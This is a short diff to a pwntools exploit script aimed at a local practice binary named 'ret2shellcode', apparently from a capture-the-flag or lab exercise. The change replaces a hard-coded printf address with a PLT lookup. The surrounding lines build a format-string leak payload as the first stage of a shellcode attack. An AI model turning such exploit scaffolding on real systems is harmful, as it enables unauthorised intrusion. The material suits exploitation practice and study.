@@ -2,7 +2,8 @@ from pwn import *
 context.arch="i386"
 p = process("./ret2shellcode")
 buf2 = 0x804A080
-printf = 0x80483C0
+printf = p.elf.plt['printf']
+
 main = p.elf.sym['main']
 payload = b"%2$p"
 payload = payload.ljust(0x70, b"\x00")
